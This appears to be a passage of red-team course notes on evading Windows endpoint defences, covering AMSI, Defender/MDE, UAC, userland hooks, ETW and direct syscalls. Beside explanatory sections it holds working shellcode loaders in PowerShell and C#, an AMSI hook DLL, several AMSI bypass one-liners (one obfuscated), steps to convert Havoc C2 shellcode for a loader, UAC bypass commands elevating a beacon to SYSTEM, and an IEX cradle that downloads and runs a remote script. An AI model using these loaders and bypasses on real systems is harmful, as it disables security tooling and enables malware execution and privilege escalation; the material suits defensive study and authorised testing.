    private static int HookedAmsiScanBuffer(IntPtr amsiContext, IntPtr buffer, uint length, string contentName, IntPtr amsiSession, out int result)
    {
        byte[] managedBuffer = new byte[length];
        Marshal.Copy(buffer, managedBuffer, 0, (int)length);
        Console.WriteLine(&quot;AMSI Scan Buffer: &quot; + BitConverter.ToString(managedBuffer));

        return originalAmsiScanBuffer(amsiContext, buffer, length, contentName, amsiSession, out result);
    }
}
</code></pre>
<p>Next, compile the C# code into a DLL:</p>
<pre><code class="language-sh">csc /target:library /out:C:\git\code\amsidll\AmsiHook.dll C:\git\code\amsidll\AmsiHook.cs
</code></pre>
<p>Then, create a PowerShell script to load the DLL and hook AMSI functions:</p>
<pre><code class="language-powershell">Add-Type -Path &quot;C:\git\code\amsidll\AmsiHook.dll&quot;

# Hook AMSI functions
[AmsiHook]::HookAmsi()

# Your shellcode loader script
$shellcode = @(0x90,0x90,0x90,0x90) # Replace with your shellcode

# Allocate memory
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)
Write-Output &quot;Allocated $($shellcode.Length) bytes of memory at address: $mem&quot;

# Copy shellcode to memory
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $mem, $shellcode.Length)
Write-Output &quot;Copied shellcode to memory at address: $mem&quot;

# Create thread to execute shellcode
$thread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, [System.Threading.ThreadStart])
Write-Output &quot;Created thread to execute shellcode at address: $mem&quot;

# Start the thread
$thread.Invoke()
Write-Output &quot;Started thread to execute shellcode&quot;

# Wait for thread to exit (optional)
[System.Threading.Thread]::Sleep(-1)
Write-Output &quot;Thread is running, waiting for it to exit (optional)&quot;
</code></pre>
<p>This script will hook into the AMSI functions and print the buffer being scanned by AMSI. Note that this is a simplified example and may require additional error handling and adjustments for a production environment.</p>
<h1><a class="header" href="#lab-13---basic-loader" id="lab-13---basic-loader">Lab 1.3 - Basic Loader</a></h1>
<p>Generate havoc shellcode</p>
<p>Convert the shellcode to a CSharp array:</p>
<pre><code class="language-powershell">$fileName = &quot;C:\temp\demon.x64.bin&quot;
$fileContent = [IO.File]::ReadAllBytes($fileName)
#$fileContent
$csharpformat = '0x' + (($fileContent | ForEach-Object ToString x2 | ForEach-Object { $_ + ',' }) -join '0x')
$csharpformat = $csharpformat.SubString(0, $csharpformat.Length-1)
Write-Output &quot;[+] Shellcode length: $($csharpformat.Length) bytes&quot;
$csharpformat | add-content ($fileName + &quot;.cs&quot;)
Write-Output &quot;[+] CSharp Shellcode written to: $filename&quot;
</code></pre>
<p>Load this shellcode into you basic loader template:</p>
<pre><code class="language-CSHARP">
</code></pre>
<h1><a class="header" href="#lab-14---remote-loader" id="lab-14---remote-loader">Lab 1.4 - Remote Loader</a></h1>
<h1><a class="header" href="#chapter-01---windows-defender--mde-edr" id="chapter-01---windows-defender--mde-edr">Chapter 0.1 - Windows Defender / MDE (EDR)</a></h1>
<p><img src="./images/howEDR.jpg" alt="Screenshot" />
<img src="./images/static.jpg" alt="Screenshot" />
<img src="./images/dynamic.jpg" alt="Screenshot" />
<img src="./images/behavior.jpg" alt="Screenshot" /></p>
<p><a href="https://www.edr-telemetry.com/windows.html">https://www.edr-telemetry.com/windows.html</a></p>
<h1><a class="header" href="#powershell" id="powershell">Powershell</a></h1>
<p>AMSI
Invoke-Obfuscastion
powershell shellcode loader (without amsi bypass)</p>
<pre><code class="language-powershell">$shellcode = @(0x90,0x90,0x90,0x90) # Replace with your shellcode

$code = @&quot;
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport(&quot;msvcrt.dll&quot;, SetLastError=true)] public static extern IntPtr memcpy(IntPtr dest, byte[] src, uint count);
}
&quot;@

Add-Type -TypeDefinition $code

# Allocate memory
$mem = [Win32]::VirtualAlloc([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)

# Copy shellcode to memory
[Win32]::memcpy($mem, $shellcode, $shellcode.Length)

# Create thread to execute shellcode
$thread = [Win32]::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

# Wait for thread to exit (optional)
[System.Runtime.InteropServices.Marshal]::WaitForSingleObject($thread, 0xFFFFFFFF)
</code></pre>
<p>Shorter version:</p>
<pre><code class="language-powershell">$shellcode = @(0x90,0x90,0x90,0x90) # Replace with your shellcode

# Allocate memory
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)

# Copy shellcode to memory
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $mem, $shellcode.Length)

# Create thread to execute shellcode
$thread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, [System.Threading.ThreadStart])

# Start the thread
$thread.Invoke()

# Wait for thread to exit (optional)
[System.Threading.Thread]::Sleep(-1)
</code></pre>
<h1><a class="header" href="#uac---user-account-control-privilege-escalation" id="uac---user-account-control-privilege-escalation">UAC - User Account Control (Privilege Escalation)</a></h1>
<p>MITRE Reference</p>
<p><img src="./images/uac_mitre.jpg" alt="image" /></p>
<p>Demo with cmd.exe -&gt; medium level even if admin
runas 
show whoami / groups
show system informer</p>
<p>start beacon as unprivileged user</p>
<p>whoami groups</p>
<pre><code class="language-bash">sudo apt install mingw-w64 -y

git clone https://github.com/icyguider/UAC-BOF-Bonanza.git
make
</code></pre>
<p>In Havoc -&gt; Script Manager Load .py</p>
<p>Set Sleep to 10</p>
<pre><code class="language-code">uac-bypass sspidatagram c:\windows\system32\cmd.exe
uac-bypass sspidatagram c:\temp\demon.x64.exe -&gt; NT Authority\System
uac-bypass silentcleanup /opt/havoc/payloads/demon.x64.exe -&gt; error
</code></pre>
<hr />
<p>Priv Esc.</p>
<pre><code class="language-powershell">powershell &quot;IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')&quot;
</code></pre>
<h1><a class="header" href="#amsi-anti-malware-scanning-interface" id="amsi-anti-malware-scanning-interface">AMSI (Anti-Malware Scanning Interface)</a></h1>
<blockquote>
<p>WARNING : Amsi loads into powershell, with dotner amsi integrates with the clr which loads AMSI on demand.</p>
</blockquote>
<p>AmsiScanBuffer
AmsiScanString
AssemblyLoad</p>
<p>Show api calls made (user to kernel/syscall)</p>
<p>Languages</p>
<hr />
<ul>
<li>powershell (scripting)</li>
<li>vb.net (scripting)</li>
<li>c# (compiled)</li>
<li>f# (compiled)</li>
</ul>
<p><img src="./images/dotnet.jpeg" alt="dotnet" /></p>
<p>AMSI</p>
<hr />
<p>Introduced in June 2015.</p>
<p>The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows your applications and services to integrate with any antimalware product that's present on a machine. AMSI provides enhanced malware protection for your end-users and their data, applications, and workloads.</p>
<p>AMSI is agnostic of antimalware vendor; it's designed to allow for the most common malware scanning and protection techniques provided by today's antimalware products that can be integrated into applications. It supports a calling structure allowing for file and memory or stream scanning, content source URL/IP reputation checks, and other techniques.</p>
<p>The AMSI feature is integrated into these components of <code>Windows 10</code>:</p>
<ul>
<li>User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)</li>
<li>PowerShell <code>v5</code> (scripts, interactive use, and dynamic code evaluation)</li>
<li>Windows Script Host (Wscript.exe and Cscript.exe) (scripts and dynamic </li>
<li>Office365 (JavaScript/VBA)</li>
<li>Windows Management Instrumentation (WMI)</li>
<li>.Net Framework 4.8 (Scanning for all assemblies) - <em><strong>NEW</strong></em></li>
</ul>
<blockquote>
<p><strong>Runtime – Antimalware Scanning for All Assemblies</strong> : In previous versions of .NET Framework, Windows Defender or third-party antimalware software would automatically scan all assemblies loaded from disk for malware. However, assemblies loaded from elsewhere, such as by using Assembly.Load(byte[]), would not be scanned and could potentially carry viruses undetected.</p>
</blockquote>
<p><a href="https://devblogs.microsoft.com/dotnet/announcing-net-framework-4-8-early-access-build-3694/">https://devblogs.microsoft.com/dotnet/announcing-net-framework-4-8-early-access-build-3694/</a></p>
<p>.NET Framework 4.8 on Windows 10 triggers scans for those assemblies by Windows Defender and many other antimalware solutions that implement the Antimalware Scan Interface. We expect that this will make it harder for malware to disguise itself in .NET programs.</p>
<p>In its default configuration, macros are scanned at runtime via AMSI except in the following scenarios:</p>
<ul>
<li>Documents opened while macro security settings are set to “Enable All Macros”</li>
<li>Documents opened from trusted locations</li>
<li>Documents that are trusted documents</li>
<li>Documents that contain VBA that is digitally signed by a trusted publisher</li>
</ul>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps">https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps</a></p>
<blockquote>
<p>Runtime – Antimalware Scanning for All Assemblies
In previous versions of .NET Framework, Windows Defender or third-party antimalware software would automatically scan all assemblies loaded from disk for malware. However, assemblies loaded from elsewhere, such as by using Assembly.Load(byte[]), would not be scanned and could potentially carry viruses undetected.</p>
<p>.NET Framework 4.8 (released April 18th on Windows 10 triggers scans for those assemblies by Windows Defender and many other antimalware solutions that implement the Antimalware Scan Interface. We expect that this will make it harder for malware to disguise itself in .NET programs.</p>
<p><strong>LINK</strong> : <a href="https://devblogs.microsoft.com/dotnet/announcing-net-framework-4-8-early-access-build-3694/">https://devblogs.microsoft.com/dotnet/announcing-net-framework-4-8-early-access-build-3694/</a></p>
<p><strong>LINK</strong> : <a href="https://en.wikipedia.org/wiki/.NET_Framework_version_history">https://en.wikipedia.org/wiki/.NET_Framework_version_history</a></p>
</blockquote>
<p><img src="./images/amsi7archi.jpg" alt="image" /></p>
<h2><a class="header" href="#supported-os" id="supported-os">Supported OS</a></h2>
<ul>
<li>Windows 10 PRO/ENTERPRISE and Windows Server 2016</li>
<li>Windows Server 2019</li>
</ul>
<h2><a class="header" href="#supported-3rd-party-antivirusedr-vendors" id="supported-3rd-party-antivirusedr-vendors">Supported 3rd party Antivirus/EDR vendors</a></h2>
<ul>
<li>Windows Defender</li>
<li>Carbon Black Defense</li>
<li>Crowdstrike Falcon</li>
<li>Kaspersky</li>
<li>McAfee Endpoint Security 10.6.0 </li>
<li>Sophos</li>
<li>Symantec (v14.3 and later)</li>
</ul>
<p><strong>LINK</strong> : <a href="https://github.com/subat0mik/whoamsi">https://github.com/subat0mik/whoamsi</a></p>
<p>To check which version of .net and the CLR is installed open a powershell prompt and type the following:</p>
<pre><code class="language-code">$psversiontable
[System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion
$dotnet = [System.Reflection.Assembly]::Load(&quot;mscorlib&quot;)
$dotnet.GetName().Version
</code></pre>
<p><img src="./images/dotnetversion.jpg" alt="image" /></p>
<p>Check Powershell installed on the system:</p>
<pre><code class="language-yaml">(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\PowerShell\*\PowerShellEngine -Name PowerShellVersion).PowerShellVersion
</code></pre>
<h2><a class="header" href="#amsitest" id="amsitest">AMSITEST</a></h2>
<pre><code class="language-yaml">It '&quot;Antimalware Scan Interface&quot; is working' {
    # AMSI test string 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
    # (in the following as an obfuscated string)
    # must throw an error if executed (blocked by AMSI)
    $TestString = &quot;FHJ+YHoTZ1ZARxNgUl5DX1YJEwRWBAFQAFBWHgsFAlEeBwAACh4LBAcDHgNSUAIHCwdQAgALBRQ=&quot;
    $Bytes = [Convert]::FromBase64String($TestString)
    $String = -join ($bytes | ForEach-Object { [char]($_ -bxor 0x33)})
    { Invoke-Expression -Command $String } | Should Throw
}
</code></pre>
<h2><a class="header" href="#amsibypass" id="amsibypass">AMSIBYPASS</a></h2>
<p>Works on 1803 and before</p>
<blockquote>
<p>This bypass does not require administrator rights!!!</p>
</blockquote>
<pre><code class="language-yaml">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic, Static').SetValue($null,$true)
</code></pre>
<p>Works on 1903, 1909 and before</p>
<pre><code class="language-yaml">sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  &quot;{1}{0}&quot;-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( &quot;1Q2U&quot;  +&quot;zX&quot;  )  -VaL ).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;((  &quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) ).&quot;g`etf`iElD&quot;(  ( &quot;{0}{2}{1}&quot; -f'amsi','d','InitFaile'  ),(  &quot;{2}{4}{0}{1}{3}&quot; -f 'Stat','i','NonPubli','c','c, ' )).&quot;sE`T`VaLUE&quot;(  ${n`ULl},${t`RuE} )
</code></pre>
<p>List <code>dirty</code> words: </p>
<pre><code class="language-yaml">[ScriptBlock].GetField('signatures', 'NonPublic, Static').GetValue($null)
</code></pre>
<hr />
<p>https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Patch-the-providers-DLL-of-Microsoft-MpOav.dll</p>
<p>check which processes have amsi.dll loaded</p>
<p>Get-Process | where {$_.modules.ModuleName -eq 'Amsi.dll'}</p>
<p>Los er door:</p>
<pre><code class="language-powershell">$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)
</code></pre>
<p>https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b</p>
<p>And finally AMSI.FAIL</p>
<hr />
<h1><a class="header" href="#dotnet-packing" id="dotnet-packing">dotnet packing</a></h1>
<p>ConfuserEx
Babel</p>
<hr />
<p>https://github.com/pracsec/AmsiScanner/tree/main/src</p>
<h1><a class="header" href="#hooks-user-land" id="hooks-user-land">Hooks (User land)</a></h1>
<p><img src="./images/hooking.jpg" alt="Screenshot" /></p>
<p>HookChecker mr. Un1c0d3r</p>
<p>dump exported funtions ntdll.dll kernelbase.dll kernel32.dll</p>
<p>command prompt visual studio 2022</p>
<p>dumpbin.exe /exports file.dll</p>
<p>Screenshot IDA JUMP</p>
<p>https://github.com/Almorabea/HookSweeper</p>
<p>https://github.com/Mr-Un1k0d3r/EDRs
Hook_finder64.exe</p>
<p>https://github.com/asaurusrex/Probatorum-EDR-Userland-Hook-Checker
compile in visual studio</p>
<p>Bitdefender install -&gt; 102 fnctions hooked</p>
<p>windgb:
u NtOpenProcess
!chkimg ntdll
needs symbols in windbg
.sympath srv*https://msdl.microsoft.com/download/symbols
!sym noisy;.reload /f /v</p>
<pre><code>u NtReadVirtualMemory
ntdll!NtReadVirtualMemory:
00007ffd`3ef0dcc0 e95b331600      jmp     00007ffd`3f071020
00007ffd`3ef0dcc5 cc              int     3
00007ffd`3ef0dcc6 cc              int     3
00007ffd`3ef0dcc7 cc              int     3
00007ffd`3ef0dcc8 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
00007ffd`3ef0dcd0 7503            jne     ntdll!NtReadVirtualMemory+0x15 (00007ffd`3ef0dcd5)
00007ffd`3ef0dcd2 0f05            syscall
00007ffd`3ef0dcd4 c3              ret
</code></pre>
<p>then look at the jump address and disassemble:</p>
<pre><code>u 00007ffd`3f071020
00007ffd`3f071020 36363636488da42400ffffff lea rsp,ss:[rsp-100h]
00007ffd`3f07102c 363648898c2438ffffff mov qword ptr ss:[rsp-0C8h],rcx
00007ffd`3f071036 48b9700da2cdf47d0000 mov rcx,7DF4CDA20D70h
00007ffd`3f071040 ff1522000000    call    qword ptr [00007ffd`3f071068]
00007ffd`3f071046 9c              pushfq
00007ffd`3f071047 48f78424f8feffffffffffff test qword ptr [rsp-108h],0FFFFFFFFFFFFFFFFh
00007ffd`3f071053 740a            je      00007ffd`3f07105f
00007ffd`3f071055 9d              popfq
</code></pre>
<p><strong>call qword ptr [00007ffd3f071068]:</strong> This is a crucial instruction. It's acallto an address stored in memory at00007ffd3f071068.  This is almost certainly a call to the actual hook function – the code that performs the custom actions.  The address 00007ffd3f071068` is acting as a pointer to the hook function.</p>
<p><strong>Examine 00007ffd3f071068:</strong> Usedq 00007ffd3f071068 in WinDbg to see what value is stored at that address.  This is the address of the actual hook function.</p>
<pre><code>dq 00007ffd3f071068
00007ffd`3f071068  00007df4`cda31000 cccccccc`cccccccc
00007ffd`3f071078  cccccccc`cccccccc 24a48d48`36363636
00007ffd`3f071088  89483636`ffffff00 b948ffff`ff38248c
00007ffd`3f071098  00007df4`cda20dc0 489c0000`002215ff
00007ffd`3f0710a8  fffffffe`f82484f7 36369d0a`74ffffff
00007ffd`3f0710b8  9dfffffe`f024a4ff cccccccc`ccccccc3
00007ffd`3f0710c8  00007df4`cda31000 cccccccc`cccccccc
00007ffd`3f0710d8  cccccccc`cccccccc 24a48d48`36363636
</code></pre>
<p>The important part is 00007df4cda31000. This is the address where the <em>real</em> hook function is located. The rest of the output (cccccccc...) is just filler (oftenccrepresents anint 3` instruction, a common breakpoint or padding value).</p>
<p>Next step:</p>
<p>Now that you have the address of the actual hook function (00007df4cda31000), you need to disassemble it to understand what it's doing.</p>
<pre><code class="language-code">u 00007df4`cda31000
00007df4`cda31000 9c              pushfq
00007df4`cda31001 48f705f4efffffffffffff test qword ptr [00007df4`cda30000],0FFFFFFFFFFFFFFFFh
00007df4`cda3100c 7515            jne     00007df4`cda31023
00007df4`cda3100e 9d              popfq
00007df4`cda3100f 488b4910        mov     rcx,qword ptr [rcx+10h]
00007df4`cda31013 48894c24f8      mov     qword ptr [rsp-8],rcx
00007df4`cda31018 488b8c2440ffffff mov     rcx,qword ptr [rsp-0C0h]
00007df4`cda31020 c20001          ret     100h
</code></pre>
<pre><code class="language-code">!address 00007df4`cda30000

Usage:                  &lt;unknown&gt;
Base Address:           00007df4`cda30000
End Address:            00007df4`cda31000
Region Size:            00000000`00001000 (   4.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000002          PAGE_READONLY
Type:                   00020000          MEM_PRIVATE
Allocation Base:        00007df4`cda30000
Allocation Protect:     00000002          PAGE_READONLY


Content source: 1 (target), length: 1000
</code></pre>
<h1><a class="header" href="#etw---event-tracing-for-windows-kernel-mode" id="etw---event-tracing-for-windows-kernel-mode">ETW - Event Tracing for Windows (Kernel mode)</a></h1>
<blockquote>
<p><strong>TL;DR</strong> ETW basically is  a kernel level debug logging mechanism in Windows - it allows to gather advanced telemetry about functions being called. Windows Even Logs contain a subset of ETW events. Typically used by application developers to debug programs, but has found its way as a telemetry source for EDR's. </p>
</blockquote>
<p>Event Tracing for Windows (ETW) is a high speed tracing facility built into Windows. Using a buffering and logging mechanism implemented in the operating system kernel, ETW provides an infrastructure for events raised by both user mode (apps) and kernel mode components (drivers). ETW can be used for system and app diagnosis, troubleshooting, and performance monitoring.</p>
<p><img src="./images/etwarch.jpg" alt="Screenshot" />
https://learn.microsoft.com/en-us/windows-hardware/test/weg/instrumenting-your-code-with-etw</p>
<p><em><strong>Provider</strong></em>
A provider is an instrumented component that generates events. A provider can be a user mode app, a kernel mode driver, or the Windows kernel itself. In addition to fixed event data (header), an event can carry user data.</p>
<p>An event is an event-based representation of data. The data can be used for in-depth analysis. An event can also be used to produce counters. Counters provide a sample-based view of data. They typically contain a small set of data to show current state, for example I/O bytes per second and interrupts per second.</p>
<p>A provider must register with ETW and send events by calling the ETW Logging APIs. Providers register a callback function for enable and disable notifications so that tracing can be enabled and disabled dynamically.</p>
<p><em><strong>Session</strong></em>
The ETW session infrastructure works as an intermediate broker that relays the events from one or more providers to the consumer. A session is a kernel object that collects events into kernel buffer and sends them to a specified file or real-time consumer process. Multiple providers can be mapped to a single session, which allows users to collect data from multiple sources.</p>
<p><em><strong>Controller</strong></em>
A controller starts, stops, or updates a trace session. A session is a unit for tracing. Providers are mapped (or enabled) to a specific session. A controller enables and disables providers so that they can start sending events to ETW. Controller functionalities can be invoked with tools provided by Microsoft or you can write your own app.</p>
<p>Logman.exe is an in-box controller app. Windows Performance Recorder (WPR) in the Windows Performance Toolkit is the recommended controller process.</p>
<p><em><strong>Consumer</strong></em>
A consumer is an app that reads a logged trace file (ETL file) or captures events in an active trace session in real time, and processes events. Event Viewer and Resource Monitor are in-box ETW consumer apps.</p>
<p>Windows Performance Analyzer (WPA) in the Windows Performance Toolkit is the recommended consumer process.</p>
<p>To see which ETW providers are running on the system</p>
<pre><code class="language-code">logman query -ets
</code></pre>
<p>logman  query providers | select-string &quot;defender&quot;</p>
<p>Notice sysmon, Windows Defender...</p>
<pre><code class="language-code">logman query providers Microsoft-Windows-Kernel-Process
</code></pre>
<table><thead><tr><th>Provider</th><th>GUID</th></tr></thead><tbody>
<tr><td>Microsoft-Windows-Kernel-Process</td><td>{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}</td></tr>
</tbody></table>
<pre><code class="language-code">logman start mysession -p {22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716} -o mytest.etl -ets
logman start mysession -p Microsoft-Windows-Kernel-Process -o mytest.etl -ets
logman stop mysession -ets
tracerpt mytest.etl
</code></pre>
<p>https://github.com/Microsoft/perfview/releases</p>
<p>logman create trace MyETWSession -p &quot;Microsoft-Windows-Kernel-Process&quot; 0x8 -o &quot;C:\temp\kernel-process.etl&quot; -ets</p>
<p>.\filebeat.exe -e -c filebeat.yml -d &quot;*&quot;</p>
<hr />
<pre><code class="language-powershell">logman start Microsoft-Windows-Kernel-Memory -p Microsoft-Windows-Kernel-Memory 0xffffffffffffffff win:informational -ets
logman stop Microsoft-Windows-Kernel-Memory -ets 
</code></pre>
<p>tracerpt .\Microsoft-Windows-Kernel-Memory.etl -o Microsoft-Windows-Kernel-Memory.evtx -of evtx -lr</p>
<p>Microsoft-Windows-DotNETRuntime
Microsoft-Windows-Threat-Intelligence</p>
<h2><a class="header" href="#provider---------------------------------guid" id="provider---------------------------------guid">Provider                                 GUID</a></h2>
<p>Microsoft-Windows-Threat-Intelligence    {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}</p>
<hr />
<table><thead><tr><th>Value</th><th>Keyword</th><th>Description</th></tr></thead><tbody>
<tr><td>0x0000000000000001</td><td>KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL</td><td>Allocates virtual memory in the local process.</td></tr>
<tr><td>0x0000000000000002</td><td>KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL_KERNEL_CALLER</td><td>Allocates virtual memory in the local process, called from kernel mode.</td></tr>
<tr><td>0x0000000000000004</td><td>KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE</td><td>Allocates virtual memory in a remote process.</td></tr>
<tr><td>0x0000000000000008</td><td>KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE_KERNEL_CALLER</td><td>Allocates virtual memory in a remote process, called from kernel mode.</td></tr>
<tr><td>0x0000000000000010</td><td>KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL</td><td>Changes the protection on a region of virtual memory in the local process.</td></tr>
<tr><td>0x0000000000000020</td><td>KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL_KERNEL_CALLER</td><td>Changes the protection on a region of virtual memory in the local process, called from kernel mode.</td></tr>
<tr><td>0x0000000000000040</td><td>KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE</td><td>Changes the protection on a region of virtual memory in a remote process.</td></tr>
<tr><td>0x0000000000000080</td><td>KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE_KERNEL_CALLER</td><td>Changes the protection on a region of virtual memory in a remote process, called from kernel mode.</td></tr>
<tr><td>0x0000000000000100</td><td>KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL</td><td>Maps a view of a file mapping into the address space of the local process.</td></tr>
<tr><td>0x0000000000000200</td><td>KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL_KERNEL_CALLER</td><td>Maps a view of a file mapping into the address space of the local process, called from kernel mode.</td></tr>
<tr><td>0x0000000000000400</td><td>KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE</td><td>Maps a view of a file mapping into the address space of a remote process.</td></tr>
<tr><td>0x0000000000000800</td><td>KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE_KERNEL_CALLER</td><td>Maps a view of a file mapping into the address space of a remote process, called from kernel mode.</td></tr>
<tr><td>0x0000000000001000</td><td>KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE</td><td>Queues an asynchronous procedure call (APC) to a thread in a remote process.</td></tr>
<tr><td>0x0000000000002000</td><td>KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE_KERNEL_CALLER</td><td>Queues an asynchronous procedure call (APC) to a thread in a remote process, called from kernel mode.</td></tr>
<tr><td>0x0000000000004000</td><td>KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE</td><td>Sets the context of a thread in a remote process.</td></tr>
<tr><td>0x0000000000008000</td><td>KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE_KERNEL_CALLER</td><td>Sets the context of a thread in a remote process, called from kernel mode.</td></tr>
<tr><td>0x0000000000010000</td><td>KERNEL_THREATINT_KEYWORD_READVM_LOCAL</td><td>Reads virtual memory in the local process.</td></tr>
<tr><td>0x0000000000020000</td><td>KERNEL_THREATINT_KEYWORD_READVM_REMOTE</td><td>Reads virtual memory in a remote process.</td></tr>
<tr><td>0x0000000000040000</td><td>KERNEL_THREATINT_KEYWORD_WRITEVM_LOCAL</td><td>Writes to virtual memory in the local process.</td></tr>
<tr><td>0x0000000000080000</td><td>KERNEL_THREATINT_KEYWORD_WRITEVM_REMOTE</td><td>Writes to virtual memory in a remote process.</td></tr>
<tr><td>0x0000000000100000</td><td>KERNEL_THREATINT_KEYWORD_SUSPEND_THREAD</td><td>Suspends a thread.</td></tr>
<tr><td>0x0000000000200000</td><td>KERNEL_THREATINT_KEYWORD_RESUME_THREAD</td><td>Resumes a suspended thread.</td></tr>
<tr><td>0x0000000000400000</td><td>KERNEL_THREATINT_KEYWORD_SUSPEND_PROCESS</td><td>Suspends all threads in a process.</td></tr>
<tr><td>0x0000000000800000</td><td>KERNEL_THREATINT_KEYWORD_RESUME_PROCESS</td><td>Resumes all threads in a suspended process.</td></tr>
<tr><td>0x0000000001000000</td><td>KERNEL_THREATINT_KEYWORD_FREEZE_PROCESS</td><td>Freezes a process, preventing it from executing.</td></tr>
<tr><td>0x0000000002000000</td><td>KERNEL_THREATINT_KEYWORD_THAW_PROCESS</td><td>Thaws a frozen process, allowing it to execute.</td></tr>
<tr><td>0x0000000004000000</td><td>KERNEL_THREATINT_KEYWORD_CONTEXT_PARSE</td><td>Parses the context of a process or thread.</td></tr>
<tr><td>0x0000000008000000</td><td>KERNEL_THREATINT_KEYWORD_EXECUTION_ADDRESS_VAD_PROBE</td><td>Probes the virtual address descriptor (VAD) for an execution address.</td></tr>
<tr><td>0x0000000010000000</td><td>KERNEL_THREATINT_KEYWORD_EXECUTION_ADDRESS_MMF_NAME_PROBE</td><td>Probes the memory-mapped file (MMF) name for an execution address.</td></tr>
<tr><td>0x0000000020000000</td><td>KERNEL_THREATINT_KEYWORD_READWRITEVM_NO_SIGNATURE_RESTRICTION</td><td>Reads or writes virtual memory without signature restrictions.</td></tr>
<tr><td>0x0000000040000000</td><td>KERNEL_THREATINT_KEYWORD_DRIVER_EVENTS</td><td>Logs events related to kernel-mode drivers.</td></tr>
<tr><td>0x0000000080000000</td><td>KERNEL_THREATINT_KEYWORD_DEVICE_EVENTS</td><td>Logs events related to device operations.</td></tr>
<tr><td>0x8000000000000000</td><td>Microsoft-Windows-Threat-Intelligence/Analytic</td><td>Logs analytic events for threat intelligence.</td></tr>
</tbody></table>
<table><thead><tr><th>Value</th><th>Level</th><th>Description</th></tr></thead><tbody>
<tr><td>0x04</td><td>win:Informational</td><td>Information</td></tr>
</tbody></table>
<table><thead><tr><th>PID</th><th>Image</th></tr></thead><tbody>
<tr><td>0x00000000</td><td></td></tr>
</tbody></table>
<p>https://github.com/Lsecqt-Sponsors/Haunt_Agent/blob/main/Payload_Type/haunt/haunt/agent_code/etw.ps1
https://github.com/MHaggis/PowerShell-Hunter</p>
<h1><a class="header" href="#syscalls-kernel-mode" id="syscalls-kernel-mode">SYSCALLS (Kernel mode)</a></h1>
<p>https://github.com/joshfinley/SyscallDumper</p>
<p>https://passthehashbrowns.github.io/hiding-your-syscalls</p>
<p>https://github.com/fin3ss3g0d/HookFinder</p>
<pre><code class="language-powershell">PS C:\git\EDRs&gt; .\hook_finder64.exe C:\windows\system32\ntdll.dll
</code></pre>
<p>https://www.secunnix.com/en/blog/cat-and-mouse-game</p>
<h1><a class="header" href="#a-direct-syscall" id="a-direct-syscall">A. Direct Syscall</a></h1>
<p>In its simplest form, the direct system calls technique can be said to implement the APIs to be used in the malware with assembly commands in the code instead of getting them through ntdll.dll, in order to prevent EDR sensors from hooking.</p>
<p>In this way, the program does not refer to ntdll.dll and uses the APIs it needs directly. Since ntdll.dll is not called, the EDR sensors will be blind because they do not inject themselves into the process. There are many PoCs for this technique, For example, Hells Gate, Halo's Gate, Syswhispers2 and 3 are successful studies that prove the application of direct syscall.</p>
<p><img src="./images/syscall_direct.jpg" alt="Screenshot" /></p>
